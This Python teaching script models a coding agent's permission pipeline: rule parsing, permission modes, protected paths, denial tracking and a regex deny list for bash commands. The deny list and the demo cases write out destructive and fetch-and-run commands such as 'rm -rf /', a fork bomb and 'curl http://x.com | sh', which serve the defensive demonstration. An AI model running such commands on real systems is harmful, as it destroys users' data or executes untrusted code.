#!/usr/bin/env python3
"""
Session 05 -- Permission System Reimplementation

A runnable Python model of Claude Code's permission pipeline.
Covers rule parsing, mode handling, bash command classification,
denial tracking, and the full permission check flow.

Reference source files:
  - src/types/permissions.ts                   (core types)
  - src/utils/permissions/permissions.ts       (main pipeline)
  - src/utils/permissions/permissionRuleParser.ts (rule string parsing)
  - src/utils/permissions/permissionsLoader.ts (disk I/O)
  - src/utils/permissions/denialTracking.ts    (circuit breaker)
  - src/utils/permissions/yoloClassifier.ts    (auto-mode AI classifier)
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

import json


# ---------------------------------------------------------------------------
# Core types  (src/types/permissions.ts)
# ---------------------------------------------------------------------------

class Behavior(Enum):
    ALLOW = "allow"
    DENY = "deny"
    ASK = "ask"


class PermissionMode(Enum):
    DEFAULT = "default"
    ACCEPT_EDITS = "acceptEdits"
    BYPASS = "bypassPermissions"
    DONT_ASK = "dontAsk"
    PLAN = "plan"
    AUTO = "auto"


# Real code has: userSettings, projectSettings, localSettings,
# flagSettings, policySettings, cliArg, command, session
class RuleSource(Enum):
    USER = "userSettings"
    PROJECT = "projectSettings"
    LOCAL = "localSettings"
    POLICY = "policySettings"
    CLI_ARG = "cliArg"
    SESSION = "session"


@dataclass
class PermissionRuleValue:
    """Parsed form of 'Bash(npm install)' -> tool_name='Bash', content='npm install'."""
    tool_name: str
    content: Optional[str] = None


@dataclass
class PermissionRule:
    """A single permission rule with its source and behavior.
    Ref: src/types/permissions.ts PermissionRule
    """
    source: RuleSource
    behavior: Behavior
    value: PermissionRuleValue


@dataclass
class PermissionDecision:
    """Result of a permission check."""
    behavior: Behavior
    reason: str
    tool_name: str = ""


# ---------------------------------------------------------------------------
# Rule string parser  (src/utils/permissions/permissionRuleParser.ts)
# ---------------------------------------------------------------------------

def parse_rule_string(rule_str: str) -> PermissionRuleValue:
    """Parse 'Tool(content)' format. Handles escaped parentheses.
    Ref: permissionRuleValueFromString in permissionRuleParser.ts
    """
    # Find first unescaped '('
    match = re.search(r'(?<!\\)\(', rule_str)
    if not match:
        return PermissionRuleValue(tool_name=rule_str)

    open_idx = match.start()
    # Find last unescaped ')'
    close_idx = -1
    for i in range(len(rule_str) - 1, open_idx, -1):
        if rule_str[i] == ')':
            # Count preceding backslashes
            num_bs = 0
            j = i - 1
            while j >= 0 and rule_str[j] == '\\':
                num_bs += 1
                j -= 1
            if num_bs % 2 == 0:
                close_idx = i
                break

    if close_idx == -1 or close_idx != len(rule_str) - 1:
        return PermissionRuleValue(tool_name=rule_str)

    tool_name = rule_str[:open_idx]
    raw_content = rule_str[open_idx + 1:close_idx]

    if not tool_name or raw_content in ('', '*'):
        return PermissionRuleValue(tool_name=tool_name or rule_str)

    # Unescape: \( -> (, \) -> ), \\ -> \
    content = raw_content.replace('\\(', '(').replace('\\)', ')').replace('\\\\', '\\')
    return PermissionRuleValue(tool_name=tool_name, content=content)


def rule_value_to_string(rv: PermissionRuleValue) -> str:
    if rv.content is None:
        return rv.tool_name
    escaped = rv.content.replace('\\', '\\\\').replace('(', '\\(').replace(')', '\\)')
    return f"{rv.tool_name}({escaped})"


# ---------------------------------------------------------------------------
# Denial tracking  (src/utils/permissions/denialTracking.ts)
# ---------------------------------------------------------------------------

MAX_CONSECUTIVE_DENIALS = 3
MAX_TOTAL_DENIALS = 20


@dataclass
class DenialTracker:
    """Circuit breaker for auto-mode denials.
    After 3 consecutive or 20 total denials, falls back to prompting.
    """
    consecutive: int = 0
    total: int = 0

    def record_denial(self) -> None:
        self.consecutive += 1
        self.total += 1

    def record_success(self) -> None:
        self.consecutive = 0

    def should_fallback(self) -> bool:
        return (self.consecutive >= MAX_CONSECUTIVE_DENIALS or
                self.total >= MAX_TOTAL_DENIALS)


# ---------------------------------------------------------------------------
# Bash command classifier  (simplified heuristic version)
# Real code: yoloClassifier.ts runs a 2-stage AI classifier
# ---------------------------------------------------------------------------

# Patterns that are always dangerous
DANGEROUS_PATTERNS = [
    r'\brm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+)?-[a-zA-Z]*r',  # rm -rf / rm -fr
    r'\brm\s+(-[a-zA-Z]*r[a-zA-Z]*\s+)?-[a-zA-Z]*f',   # rm -rf variants
    r'\bsudo\b',                                          # sudo anything
    r'\bchmod\s+777\b',                                   # chmod 777
    r'\bmkfs\b',                                          # format filesystem
    r'\bdd\s+',                                           # disk destroyer
    r'>\s*/dev/sd[a-z]',                                  # overwrite disk
    r'\bcurl\b.*\|\s*(ba)?sh',                            # curl | bash
    r'\bwget\b.*\|\s*(ba)?sh',                            # wget | bash
    r':\(\)\s*\{\s*:\|:&\s*\}\s*;',                      # fork bomb
    r'\bshutdown\b',                                      # shutdown
    r'\breboot\b',                                        # reboot
]

# Patterns that are safe in most contexts
SAFE_PATTERNS = [
    r'^ls(\s|$)',
    r'^cat\s',
    r'^echo\s',
    r'^pwd$',
    r'^git\s+(status|log|diff|branch)',
    r'^npm\s+(install|test|run|list)',
    r'^pip\s+(install|list|show)',
    r'^python3?\s+-c\s',
    r'^head\s',
    r'^tail\s',
    r'^wc\s',
    r'^grep\s',
    r'^find\s',
]


def classify_bash_command(command: str) -> Behavior:
    """Simplified bash command classifier.

    Real implementation (yoloClassifier.ts) uses a 2-stage XML classifier:
      Stage 1 (fast): <block>yes/no</block> -- quick decision
      Stage 2 (thinking): chain-of-thought to reduce false positives

    This heuristic version uses regex patterns instead.
    """
    cmd_stripped = command.strip()

    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, cmd_stripped):
            return Behavior.DENY

    for pattern in SAFE_PATTERNS:
        if re.search(pattern, cmd_stripped):
            return Behavior.ALLOW

    return Behavior.ASK


# ---------------------------------------------------------------------------
# Permission Engine  (src/utils/permissions/permissions.ts)
# ---------------------------------------------------------------------------

# Protected paths that are bypass-immune (step 1g safety checks)
PROTECTED_PATHS = ['.git/', '.claude/', '.vscode/', '.bashrc', '.zshrc', '.profile']


@dataclass
class PermissionEngine:
    """Reimplementation of the permission pipeline.

    Main entry: check_permission(tool_name, args)

    Pipeline steps mirror hasPermissionsToUseToolInner:
      1a. Entire tool denied by rule         -> DENY
      1b. Entire tool has ask rule           -> ASK
      1c. Tool-specific check (bash/write)   -> DENY/ASK/ALLOW
      1f. Content-specific ask rule          -> ASK (bypass-immune)
      1g. Safety check (protected paths)     -> ASK (bypass-immune)
      2a. bypassPermissions mode?            -> ALLOW
      2b. Entire tool has allow rule?        -> ALLOW
      3.  Default: passthrough -> ASK

    Ref: hasPermissionsToUseToolInner() in permissions.ts
    """
    rules: list[PermissionRule] = field(default_factory=list)
    mode: PermissionMode = PermissionMode.DEFAULT
    denial_tracker: DenialTracker = field(default_factory=DenialTracker)

    # -- Rule accessors (ref: getAllowRules, getDenyRules, getAskRules) --

    def _rules_for(self, behavior: Behavior) -> list[PermissionRule]:
        return [r for r in self.rules if r.behavior == behavior]

    def _tool_matches_rule(self, tool_name: str, rule: PermissionRule) -> bool:
        """Check if a whole-tool rule matches (no content).
        Ref: toolMatchesRule() in permissions.ts
        """
        if rule.value.content is not None:
            return False
        if rule.value.tool_name == tool_name:
            return True
        # MCP server-level match: rule 'mcp__server1' matches 'mcp__server1__tool'
        if (rule.value.tool_name.startswith('mcp__') and
                tool_name.startswith(rule.value.tool_name + '__')):
            return True
        return False

    def _content_matches(self, tool_name: str, content: str,
                         rule: PermissionRule) -> bool:
        """Check if a content-specific rule matches.
        Real code: each tool's checkPermissions handles its own matching.
        Here we do simple prefix matching.
        """
        if rule.value.tool_name != tool_name or rule.value.content is None:
            return False
        rule_content = rule.value.content
        # prefix: matching (e.g., 'prefix:git *')
        if rule_content.startswith('prefix:'):
            prefix = rule_content[len('prefix:'):]
            return content.startswith(prefix)
        # Exact match
        return content == rule_content or content.startswith(rule_content + ' ')

    # -- Safety checks (step 1g) --

    def _is_protected_path(self, path: str) -> bool:
        """Check if a file path targets a protected location.
        These are bypass-immune in real code.
        """
        return any(protected in path for protected in PROTECTED_PATHS)

    # -- Main pipeline --

    def check_permission(self, tool_name: str,
                         args: Optional[dict] = None) -> PermissionDecision:
        """Main permission check pipeline.
        Ref: hasPermissionsToUseToolInner + hasPermissionsToUseTool
        """
        args = args or {}

        # Step 1a: Entire tool denied by rule
        for rule in self._rules_for(Behavior.DENY):
            if self._tool_matches_rule(tool_name, rule):
                return PermissionDecision(
                    Behavior.DENY, f"Tool '{tool_name}' denied by {rule.source.value} rule",
                    tool_name)

        # Step 1b: Entire tool has ask rule
        for rule in self._rules_for(Behavior.ASK):
            if self._tool_matches_rule(tool_name, rule):
                return PermissionDecision(
                    Behavior.ASK, f"Tool '{tool_name}' requires approval ({rule.source.value})",
                    tool_name)

        # Step 1c/1d: Tool-specific permission check
        command = args.get('command', '')
        file_path = args.get('file_path', '')

        # Content-specific deny rules
        content = command or file_path
        if content:
            for rule in self._rules_for(Behavior.DENY):
                if self._content_matches(tool_name, content, rule):
                    return PermissionDecision(
                        Behavior.DENY,
                        f"Content '{content}' denied by rule '{rule_value_to_string(rule.value)}'",
                        tool_name)

        # Step 1f: Content-specific ask rules (bypass-immune)
        if content:
            for rule in self._rules_for(Behavior.ASK):
                if self._content_matches(tool_name, content, rule):
                    return PermissionDecision(
                        Behavior.ASK,
                        f"Content '{content}' requires approval per rule '{rule_value_to_string(rule.value)}'",
                        tool_name)

        # Bash-specific classification
        if tool_name == 'Bash' and command:
            bash_result = classify_bash_command(command)
            if bash_result == Behavior.DENY:
                return PermissionDecision(
                    Behavior.DENY, f"Bash command classified as dangerous: {command}",
                    tool_name)

        # Step 1g: Safety checks (bypass-immune)
        if file_path and self._is_protected_path(file_path):
            return PermissionDecision(
                Behavior.ASK,
                f"Protected path '{file_path}' requires explicit approval (safety check)",
                tool_name)

        # Step 2a: bypassPermissions mode
        if self.mode == PermissionMode.BYPASS:
            return PermissionDecision(
                Behavior.ALLOW, "Allowed by bypassPermissions mode", tool_name)

        # Step 2b: Entire tool allowed by rule
        for rule in self._rules_for(Behavior.ALLOW):
            if self._tool_matches_rule(tool_name, rule):
                return PermissionDecision(
                    Behavior.ALLOW,
                    f"Tool '{tool_name}' allowed by {rule.source.value} rule",
                    tool_name)

        # Content-specific allow rules
        if content:
            for rule in self._rules_for(Behavior.ALLOW):
                if self._content_matches(tool_name, content, rule):
                    return PermissionDecision(
                        Behavior.ALLOW,
                        f"Content allowed by rule '{rule_value_to_string(rule.value)}'",
                        tool_name)

        # Step 3: Apply mode transformations on the default ASK
        result = PermissionDecision(
            Behavior.ASK, f"No rule matched for '{tool_name}'; prompting user",
            tool_name)

        # dontAsk mode converts ASK -> DENY (ref: outer wrapper in permissions.ts)
        if self.mode == PermissionMode.DONT_ASK:
            return PermissionDecision(
                Behavior.DENY,
                f"dontAsk mode: '{tool_name}' denied (no prompting allowed)",
                tool_name)

        # auto mode would run the AI classifier here
        # (simplified: use bash classifier result if applicable)
        if self.mode == PermissionMode.AUTO and tool_name == 'Bash' and command:
            classification = classify_bash_command(command)
            if classification == Behavior.ALLOW:
                self.denial_tracker.record_success()
                return PermissionDecision(
                    Behavior.ALLOW, "Auto-mode classifier allowed", tool_name)
            else:
                self.denial_tracker.record_denial()
                if self.denial_tracker.should_fallback():
                    return PermissionDecision(
                        Behavior.ASK,
                        f"Denial limit exceeded ({self.denial_tracker.consecutive} consecutive) "
                        f"-- falling back to prompting", tool_name)
                return PermissionDecision(
                    Behavior.DENY, "Auto-mode classifier blocked", tool_name)

        return result


# ---------------------------------------------------------------------------
# Config loading from JSON  (ref: permissionsLoader.ts loads from JSON)
# Real code reads ~/.claude/settings.json, .claude/settings.json, etc.
# Here we use an in-memory dict with the same structure.
# ---------------------------------------------------------------------------

# This mirrors the real settings.json format:
#   { "permissions": { "allow": [...], "deny": [...], "ask": [...] } }
# We wrap multiple sources into a single config dict for the demo.

SAMPLE_CONFIG: dict = {
    "mode": "default",
    "rules": {
        # User-global settings (~/.claude/settings.json)
        "userSettings": {
            "allow": [
                "Read",
                "Bash(prefix:git )",
                "Bash(npm test)",
            ],
            "deny": [
                "Bash(rm -rf /)",
            ],
            "ask": [
                "Bash(npm publish)",
            ],
        },
        # Project settings (.claude/settings.json)
        "projectSettings": {
            "allow": [
                "Write",
                "Bash(prefix:python3 )",
            ],
            "deny": [
                "mcp__untrusted_server",
            ],
        },
    },
}

SOURCE_MAP = {
    'userSettings': RuleSource.USER,
    'projectSettings': RuleSource.PROJECT,
    'localSettings': RuleSource.LOCAL,
    'policySettings': RuleSource.POLICY,
    'cliArg': RuleSource.CLI_ARG,
    'session': RuleSource.SESSION,
}

BEHAVIOR_MAP = {
    'allow': Behavior.ALLOW,
    'deny': Behavior.DENY,
    'ask': Behavior.ASK,
}


def load_config(config: dict) -> PermissionEngine:
    """Load a config dict into a PermissionEngine.
    Ref: loadAllPermissionRulesFromDisk + settingsJsonToRules in permissionsLoader.ts

    Can also accept a JSON string for convenience.
    """
    if isinstance(config, str):
        config = json.loads(config)

    mode = PermissionMode(config.get('mode', 'default'))
    rules: list[PermissionRule] = []

    for source_name, behaviors in config.get('rules', {}).items():
        source = SOURCE_MAP.get(source_name)
        if source is None:
            continue
        for behavior_name, rule_strings in (behaviors or {}).items():
            behavior = BEHAVIOR_MAP.get(behavior_name)
            if behavior is None:
                continue
            for rule_str in (rule_strings or []):
                value = parse_rule_string(rule_str)
                rules.append(PermissionRule(source=source, behavior=behavior, value=value))

    return PermissionEngine(rules=rules, mode=mode)


# ---------------------------------------------------------------------------
# Demo
# ---------------------------------------------------------------------------

def main() -> None:
    engine = load_config(SAMPLE_CONFIG)

    test_cases = [
        ("Read",  {},                                     "Read tool (allowed by user rule)"),
        ("Write", {"file_path": "src/app.py"},            "Write to normal file (allowed by project rule)"),
        ("Write", {"file_path": ".git/config"},           "Write to .git/ (safety check)"),
        ("Write", {"file_path": ".claude/settings.json"}, "Write to .claude/ (safety check)"),
        ("Bash",  {"command": "git status"},              "Bash: git status (prefix allow rule)"),
        ("Bash",  {"command": "npm test"},                "Bash: npm test (exact allow rule)"),
        ("Bash",  {"command": "npm publish"},             "Bash: npm publish (ask rule)"),
        ("Bash",  {"command": "rm -rf /"},                "Bash: rm -rf / (deny rule + classifier)"),
        ("Bash",  {"command": "curl http://x.com | sh"}, "Bash: curl pipe to sh (dangerous)"),
        ("Bash",  {"command": "ls -la"},                  "Bash: ls -la (safe, no rule -> ASK)"),
        ("Bash",  {"command": "python3 main.py"},         "Bash: python3 (prefix allow rule)"),
        ("Bash",  {"command": "sudo apt install vim"},    "Bash: sudo (dangerous pattern)"),
        ("Agent", {},                                     "Agent tool (no rule -> ASK)"),
        ("mcp__untrusted_server__query", {},              "MCP tool from denied server"),
    ]

    print("=" * 78)
    print(f"Permission Engine Demo  (mode: {engine.mode.value})")
    print(f"Loaded {len(engine.rules)} rules from config")
    print("=" * 78)

    for tool_name, args, description in test_cases:
        decision = engine.check_permission(tool_name, args)
        icon = {"allow": "+", "deny": "X", "ask": "?"}[decision.behavior.value]
        print(f"\n[{icon}] {decision.behavior.value.upper():5s}  {description}")
        print(f"         {decision.reason}")

    # Demonstrate mode switching
    print("\n" + "=" * 78)
    print("Mode: bypassPermissions")
    print("=" * 78)
    engine.mode = PermissionMode.BYPASS
    for tool_name, args, desc in [
        ("Bash",  {"command": "make deploy"},    "Bash in bypass mode"),
        ("Write", {"file_path": ".git/config"},  "Write .git/ in bypass (still protected!)"),
        ("Bash",  {"command": "npm publish"},     "Bash: npm publish (ask rule is bypass-immune)"),
    ]:
        decision = engine.check_permission(tool_name, args)
        icon = {"allow": "+", "deny": "X", "ask": "?"}[decision.behavior.value]
        print(f"\n[{icon}] {decision.behavior.value.upper():5s}  {desc}")
        print(f"         {decision.reason}")

    # Demonstrate dontAsk mode
    print("\n" + "=" * 78)
    print("Mode: dontAsk")
    print("=" * 78)
    engine.mode = PermissionMode.DONT_ASK
    decision = engine.check_permission("Agent", {})
    icon = {"allow": "+", "deny": "X", "ask": "?"}[decision.behavior.value]
    print(f"\n[{icon}] {decision.behavior.value.upper():5s}  Agent in dontAsk mode")
    print(f"         {decision.reason}")

    # Demonstrate denial tracking
    print("\n" + "=" * 78)
    print("Denial Tracking Demo (auto mode)")
    print("=" * 78)
    engine.mode = PermissionMode.AUTO
    engine.denial_tracker = DenialTracker()
    for i in range(5):
        decision = engine.check_permission("Bash", {"command": "some-unknown-cmd"})
        icon = {"allow": "+", "deny": "X", "ask": "?"}[decision.behavior.value]
        print(f"\n  Attempt {i+1}: [{icon}] {decision.behavior.value.upper():5s}")
        print(f"             {decision.reason}")
        print(f"             (consecutive={engine.denial_tracker.consecutive}, "
              f"total={engine.denial_tracker.total})")


if __name__ == '__main__':
    main()
